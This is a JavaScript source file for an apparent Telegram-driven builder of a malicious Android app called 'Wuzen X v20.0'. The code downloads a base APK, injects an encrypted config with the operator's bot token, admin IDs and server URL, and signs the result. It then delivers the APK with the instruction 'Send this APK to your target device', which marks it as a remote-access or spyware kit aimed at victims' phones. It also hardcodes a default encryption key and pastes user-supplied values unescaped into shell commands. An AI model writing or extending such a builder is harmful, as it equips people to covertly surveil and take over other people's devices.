import fs from 'fs';
import path from 'path';
import { execSync } from 'child_process';
import crypto from 'crypto';
import axios from 'axios';
import os from 'os';
import config from './config.js';

const BUILD_DIR = path.join(os.tmpdir(), 'wuzenx-build-' + Date.now());
const KEYSTORE_PATH = path.join(BUILD_DIR, 'keystore.jks');
const CONFIG_ENCRYPTED = path.join(BUILD_DIR, 'config.enc');
const PATCHED_APK = path.join(BUILD_DIR, 'patched.apk');

export class ApkBuilder {
    constructor(bot) {
        this.bot = bot;
        this.builds = new Map();
    }

    async build(botToken, chatId, adminId, channelId, keystorePass, keyAlias, options = {}) {
        const buildId = Date.now().toString();
        this.builds.set(chatId, { status: 'starting', progress: 0, buildId });

        try {
            await this.sendProgress(chatId, '🔄 **Initializing build environment...**', 5);

            const baseApkSource = options.baseApkUrl || config.BASE_APK_URL;
            const baseApkPath = path.join(BUILD_DIR, 'base.apk');

            if (options.localBaseApk && fs.existsSync(options.localBaseApk)) {
                fs.copyFileSync(options.localBaseApk, baseApkPath);
                await this.sendProgress(chatId, '📦 **Base APK loaded from local source**', 20);
            } else if (baseApkSource) {
                await this.sendProgress(chatId, '⬇️ **Downloading base APK...**', 15);
                const response = await axios({
                    method: 'GET',
                    url: baseApkSource,
                    responseType: 'stream',
                    timeout: 120000
                });
                const writer = fs.createWriteStream(baseApkPath);
                response.data.pipe(writer);
                await new Promise((resolve, reject) => {
                    writer.on('finish', resolve);
                    writer.on('error', reject);
                });
                await this.sendProgress(chatId, '✅ **Base APK downloaded**', 20);
            } else {
                throw new Error('No base APK source configured. Set BASE_APK_URL or provide localBaseApk.');
            }

            if (!fs.existsSync(baseApkPath)) {
                throw new Error('Base APK file not found after download');
            }
            const stats = fs.statSync(baseApkPath);
            if (stats.size < 100000) {
                throw new Error(`Base APK too small (${stats.size} bytes), may be corrupted`);
            }
            await this.sendProgress(chatId, `✅ **Base APK verified** (${(stats.size / 1024 / 1024).toFixed(2)} MB)`, 25);

            await this.sendProgress(chatId, '🔐 **Creating encrypted configuration...**', 30);
            this.createConfigEnc(botToken, adminId, channelId, options);
            await this.sendProgress(chatId, '✅ **Config encrypted**', 40);

            fs.copyFileSync(baseApkPath, PATCHED_APK);
            await this.sendProgress(chatId, '📝 **Preparing to inject config...**', 50);

            await this.sendProgress(chatId, '💉 **Injecting configuration into APK...**', 55);
            try {
                execSync(`zip -u "${PATCHED_APK}" "${CONFIG_ENCRYPTED}"`, {
                    cwd: BUILD_DIR,
                    stdio: ['pipe', 'pipe', 'pipe'],
                    timeout: 30000
                });
            } catch (zipErr) {
                try {
                    execSync(`aapt add "${PATCHED_APK}" "${CONFIG_ENCRYPTED}"`, {
                        cwd: BUILD_DIR,
                        stdio: ['pipe', 'pipe', 'pipe'],
                        timeout: 30000
                    });
                } catch (aaptErr) {
                    const extractDir = path.join(BUILD_DIR, 'extracted');
                    fs.mkdirSync(extractDir, { recursive: true });
                    execSync(`unzip -o "${PATCHED_APK}" -d "${extractDir}"`, {
                        stdio: ['pipe', 'pipe', 'pipe'],
                        timeout: 60000
                    });
                    fs.copyFileSync(CONFIG_ENCRYPTED, path.join(extractDir, 'config.enc'));
                    fs.unlinkSync(PATCHED_APK);
                    execSync(`cd "${extractDir}" && zip -r "${PATCHED_APK}" .`, {
                        stdio: ['pipe', 'pipe', 'pipe'],
                        timeout: 120000
                    });
                    fs.rmSync(extractDir, { recursive: true, force: true });
                }
            }
            await this.sendProgress(chatId, '✅ **Configuration injected**', 65);

            try {
                const checkResult = execSync(`unzip -l "${PATCHED_APK}" config.enc`, {
                    encoding: 'utf8',
                    timeout: 10000
                });
                if (!checkResult.includes('config.enc')) {
                    throw new Error('config.enc not found in APK after injection');
                }
            } catch (checkErr) {
                throw new Error('Failed to verify config injection: ' + checkErr.message);
            }
            await this.sendProgress(chatId, '✅ **Config injection verified**', 70);

            await this.sendProgress(chatId, '✍️ **Signing APK...**', 75);
            await this.createKeystore(keystorePass, keyAlias);

            try {
                execSync(`apksigner sign --ks "${KEYSTORE_PATH}" --ks-pass pass:${keystorePass} --ks-key-alias ${keyAlias} --out "${PATCHED_APK}.signed" "${PATCHED_APK}"`, {
                    stdio: ['pipe', 'pipe', 'pipe'],
                    timeout: 60000
                });
                fs.renameSync(`${PATCHED_APK}.signed`, PATCHED_APK);
            } catch (apksignerErr) {
                try {
                    execSync(`jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "${KEYSTORE_PATH}" -storepass ${keystorePass} -keypass ${keystorePass} "${PATCHED_APK}" ${keyAlias}`, {
                        stdio: ['pipe', 'pipe', 'pipe'],
                        timeout: 60000
                    });
                } catch (jarsignerErr) {
                    throw new Error('APK signing failed: ' + jarsignerErr.message);
                }
            }
            await this.sendProgress(chatId, '✅ **APK signed successfully**', 85);

            try {
                execSync(`zipalign -f -v 4 "${PATCHED_APK}" "${PATCHED_APK}.aligned"`, {
                    stdio: ['pipe', 'pipe', 'pipe'],
                    timeout: 30000
                });
                fs.renameSync(`${PATCHED_APK}.aligned`, PATCHED_APK);
                await this.sendProgress(chatId, '✅ **APK optimized (zipaligned)**', 90);
            } catch (zipalignErr) {
                await this.sendProgress(chatId, '⚠️ **Zipalign skipped (optional)**', 90);
            }

            await this.sendProgress(chatId, '📤 **Uploading APK to Telegram...**', 95);

            const apkSize = fs.statSync(PATCHED_APK).size;
            const apkReadStream = fs.createReadStream(PATCHED_APK);

            await this.bot.telegram.sendDocument(
                chatId,
                { source: apkReadStream, filename: `WuzenX_v20.apk` },
                {
                    caption: `🔥 *Wuzen X v20.0* 🔥\n\n✅ Build Complete\n📦 Size: ${(apkSize / 1024 / 1024).toFixed(2)} MB\n🆔 Build: \`${buildId}\`\n\n*Bot Token:* \`${botToken.substring(0, 8)}...\`\n*Admin ID:* \`${adminId}\`\n\n⚠️ *Send this APK to your target device.*`,
                    parse_mode: 'Markdown'
                }
            );

            await this.sendProgress(chatId, '✅ **Build Complete!**', 100);

            setTimeout(() => {
                this.cleanup(BUILD_DIR);
            }, 5 * 60 * 1000);

            this.builds.set(chatId, { status: 'complete', progress: 100, buildId });

        } catch (error) {
            console.error('Build error:', error);
            this.builds.set(chatId, { status: 'failed', error: error.message, buildId });

            await this.bot.telegram.sendMessage(chatId,
                `❌ *Build Failed:*\n\`${error.message}\`\n\n🔍 *Check:*\n1. Base APK is valid and accessible\n2. Keystore password is correct\n3. Server has zip/unzip installed\n4. Sufficient disk space`,
                { parse_mode: 'Markdown' }
            );

            setTimeout(() => {
                this.cleanup(BUILD_DIR);
            }, 30000);
        }
    }

    createConfigEnc(botToken, adminId, channelId, options) {
        const configData = {
            bot_token: botToken,
            admin_ids: Array.isArray(adminId) ? adminId : [parseInt(adminId)],
            channel_id: channelId,
            server_url: options.serverUrl || config.SERVER_URL,
            timestamp: Date.now(),
            version: '20.0'
        };

        const encryptionKey = crypto.createHash('sha256')
            .update(config.ENCRYPTION_KEY || 'WuzenX2026DefaultKey!@#$%^&*()')
            .digest();

        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-cbc', encryptionKey, iv);

        let encrypted = cipher.update(JSON.stringify(configData), 'utf8', 'hex');
        encrypted += cipher.final('hex');

        const finalPayload = iv.toString('hex') + ':' + encrypted;

        fs.writeFileSync(CONFIG_ENCRYPTED, finalPayload, 'utf8');
    }

    async createKeystore(keystorePass, keyAlias) {
        if (config.KEYSTORE_BASE64) {
            const keystoreBuffer = Buffer.from(config.KEYSTORE_BASE64, 'base64');
            fs.writeFileSync(KEYSTORE_PATH, keystoreBuffer);
            return;
        }

        execSync(`keytool -genkey -v -keystore "${KEYSTORE_PATH}" -alias ${keyAlias} -keyalg RSA -keysize 2048 -validity 10000 -storepass ${keystorePass} -keypass ${keystorePass} -dname "CN=WuzenX, OU=Development, O=WuzenX, L=Unknown, ST=Unknown, C=US"`, {
            stdio: ['pipe', 'pipe', 'pipe'],
            timeout: 30000
        });
    }

    async sendProgress(chatId, message, progress) {
        try {
            const status = this.builds.get(chatId);
            if (status) {
                status.progress = progress;
                status.lastMessage = message;
            }

            const barLength = 20;
            const filledLength = Math.floor(progress * barLength / 100);
            const bar = '█'.repeat(filledLength) + '░'.repeat(barLength - filledLength);

            await this.bot.telegram.sendMessage(chatId,
                `🔧 *Building Wuzen X v20.0...*\n\n${bar} \`${progress}%\`\n\n${message}`,
                { parse_mode: 'Markdown' }
            );
        } catch (err) {
            console.error('Progress send error:', err);
        }
    }

    cleanup(dirPath) {
        try {
            if (fs.existsSync(dirPath)) {
                fs.rmSync(dirPath, { recursive: true, force: true });
            }
        } catch (err) {
            console.error('Cleanup error:', err);
        }
    }

    getBuildStatus(chatId) {
        return this.builds.get(chatId) || null;
    }
}

export default ApkBuilder;
